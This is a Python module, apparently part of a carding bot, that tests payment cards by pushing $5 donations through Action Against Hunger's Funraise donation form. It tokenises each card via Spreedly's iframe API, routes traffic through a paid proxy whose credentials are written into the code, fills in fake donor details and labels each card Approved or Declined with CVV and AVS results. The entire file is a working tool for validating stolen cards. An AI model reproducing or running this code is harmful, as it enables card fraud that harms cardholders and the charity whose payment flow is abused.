import requests , json , time , re , asyncio
from ....core.logger import log
log.info("Imported Spreedly on bot")
def cleanhtml(raw_html):
    CLEANR = re.compile('<.*?>') 
    cleantext = re.sub(CLEANR, '', raw_html)
    return cleantext
def Cap( data, first, last ):
    try:
        start = data.index( first ) + len( first )
        end = data.index( last, start )
        return data[start:end]
    except ValueError:
        return None

proxies={
        "http": "http://bala47239mneb154570:B5NWb6UhyEqRCK6D@isp2.hydraproxy.com:9989/",
        "https": "http://bala47239mneb154570:B5NWb6UhyEqRCK6D@isp2.hydraproxy.com:9989/"
    }
def get(r):
    headers = {'authority': 'www.actionagainsthunger.org',
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
'accept-language': 'en-US,en;q=0.5',
'referer': 'https://www.google.com/',
'upgrade-insecure-requests': '1',
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}
    get = r.get('https://www.actionagainsthunger.org/',headers=headers,proxies=proxies)
    x = Cap(get.text,"orgID = '","'")
    return x
def first(r,cc,mes,ano,cvv):
    headers = {'authority': 'core.spreedly.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://core.spreedly.com',
    'referer': 'https://core.spreedly.com/v1/embedded/number-frame-1.95.html',
    'spreedly-environment-key': 'KvcTOx3FPBgscLs51rjT848DP7p',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}
    a = r.post('https://core.spreedly.com/v1/payment_methods/restricted.json?from=iframe&v=1.95',headers=headers,proxies=proxies,data='{"environment_key":"KvcTOx3FPBgscLs51rjT848DP7p","payment_method":{"credit_card":{"number":"'+cc+'","verification_value":"'+cvv+'","first_name":"jhon","last_name":"doe","email":"aircracker2021@hotmail.com","month":"'+mes+'","year":"'+ano+'","address1":"576 Brown Avenue","city":"Seneca","state":"South Carolina","zip":"29678","country":"United States","phone_number":"8032011712"}}}')
    token = json.loads(a.text)['transaction']['payment_method']['token']
    
    return token 

def second(r,token , x):
    headers = {'authority': 'platform.funraise.io',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.5',
    'content-type': 'application/json; charset=UTF-8',
    'origin': 'https://assets.funraise.io',
    'referer': 'https://assets.funraise.io/',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'x-org-id': x,}
    b = r.post('https://platform.funraise.io/api/v2/transaction',headers=headers,proxies=proxies,data='{"address":"576 Brown Avenue","addressId":null,"addressValue":null,"amount":"5.00","anonymous":false,"answers":[],"bankAccountHolderType":"personal","bankAccountNumber":null,"bankAccountType":"checking","bankName":null,"bankRoutingNumber":null,"baseAmount":"5.00","city":"Seneca","comment":null,"company":null,"companyId":null,"companyMatch":false,"country":"United States","currency":"USD","dcfFeeAmount":"0.00","dedicationEmail":null,"dedicationMessage":null,"dedicationName":null,"dedicationType":null,"donationAmount":5,"donorCoveredFees":false,"donorCoversFeesVersion":null,"email":"aircracker2021@hotmail.com","emailOptIn":true,"employeeEmail":null,"firstName":"jhon","formAllocationId":null,"formId":1344,"forter":{"retailerCookie":null,"tokenCookie":"8ead15a37676423eb95340afd13f2a31_1672326034211_105_UDF9bs_13ck_tt"},"frequency":"o","hasComment":false,"isDedication":false,"institutionCategory":null,"institutionName":null,"intendedAmount":null,"lastName":"doe","match":false,"operationsTip":false,"organizationId":"e903bf1c-1df2-4a95-a37c-61a636c7e863","pageId":null,"paymentTechnology":"SPREEDLY","paymentToken":"'+token+'","paymentType":"card","phone":"8032011712","postalCode":"29678","recaptchaNotSolved":true,"recaptchaResponse":null,"recurring":false,"referrer":"https://www.google.com/","sourceUrl":"https://www.actionagainsthunger.org/","state":"South Carolina","storeOrderAmount":"0.00","suffix":null,"supportsDonorCoversFees":false,"tags":null,"tipAmount":0.15,"tipPercent":3,"titlePrefix":null,"storeOrderOffers":[],"ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"}')
    id = json.loads(b.text)['id']
    time.sleep(4)
    return id


def third(r,id):
    headers = {'authority': 'platform.funraise.io',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.5',
    'content-type': 'application/json; charset=UTF-8',
    'origin': 'https://assets.funraise.io',
    'referer': 'https://assets.funraise.io/',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',}
    c = r.get(f'https://platform.funraise.io/api/v2/transaction/{id}',headers=headers,proxies=proxies)
    message = json.loads(c.text)['message']
    avs = json.loads(c.text)['avs']
    cvv = json.loads(c.text)['cvv']
    if cvv == 'CVV matches':
        cvv = 'M'
    elif cvv == 'CVV does not match':
        cvv = 'N'
    elif cvv == None:
        cvv = 'U/A'
    if 'Thank you' in c.text:
        return  f'{message}',f"{avs}", f'{cvv}',"✅", 'Approved'
    if 'CVV does not match' in c.text:
        return  f'{message}',f"{avs}", f'{cvv}',"✅", 'Approved'
    elif 'Insufficient Funds' in message:
        return "Insufficient Funds",f"{avs}",f'{cvv}',"✅","Approved"
    else:
        mess = cleanhtml(message).strip()
        r_respo = mess if mess else "DECLINED / UNKNOWN ERROR"
        return r_respo,f"{avs}",f'{cvv}',"❌", 'Declined'